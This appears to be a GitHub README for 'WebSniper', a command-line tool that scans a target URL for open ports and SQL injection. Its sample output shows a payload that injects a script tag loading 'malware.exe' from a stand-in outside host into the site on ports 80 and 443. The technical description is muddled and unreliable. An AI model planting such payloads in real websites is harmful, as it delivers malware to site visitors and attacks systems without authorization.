# WebSniper
WebSniper is a powerful web security scanning tool that can help you identify potential vulnerabilities in your web applications. With its advanced scanning capabilities, WebSniper can quickly and accurately detect open ports, SQL injection vulnerabilities, and other security weaknesses. 

# I have created more advanced branches of this tool , will be uploading as websniper1.o.py

## Features
- Scans for open ports on web servers
- Injects malicious payloads into web applications to test for vulnerabilities
- Detects SQL injection vulnerabilities
- Provides detailed reports of scanning results
- easy-to-use command-line interface
## Result
```bash
[+] Scanning for open ports...
[+] Open ports: [80, 443]
[+] Creating payload...
[+] Payload created: {'command': "echo '<html><body><script src='http://example.com/malware.exe'></script></body></html>'"}
[+] Injecting payload...
Payload injected successfully on port 80
Payload injected successfully on port 443
[+] Scanning for SQL injection vulnerabilities...
[-] No SQL injection vulnerabilities found.

The script found two open ports (80 and 443) and successfully injected the payload on both of them. No SQL injection vulnerabilities were found.
```
## Installation
* To install WebSniper, simply clone the repository and run the websniper.py script:
Clone the repository:
```bash
 git clone https://github.com/cypherdavy/websniper.git 
```
* Navigate to the repository directory: 
```bash
cd websniper
```

Make the script executable:
```bash
 chmod +x websniper.py
```

## websniper1.o Installation

Clone the repository:
```bash
 git clone https://github.com/cypherdavy/websniper.git
```
* Navigate to the repository directory: 
```bash
cd websniper
```

Make the script executable:
```bash
 chmod +x websniper1.o.py
```

## Usage

To use WebSniper, simply run the websniper.py script followed by the target URL:
```bash
./websniper.py <target-url>

```
WebSniper will first perform a quick scan of the website and output a captivating message based on the scan results. Then, the script will continue to search for vulnerabilities, including open ports and SQL injection vulnerabilities.

## websniper1.o Usage 

```bash
./websniper1.o.py <target-url>

```


## Disclaimer
Please note that unauthorized scanning or attacking of websites is illegal and unethical. Always obtain proper authorization before performing any security testing.

## License

WebSniper is released under the MIT License. See LICENSE for details.

## Contributing
Contributions are welcome! If you'd like to contribute to WebSniper, please submit a pull request.

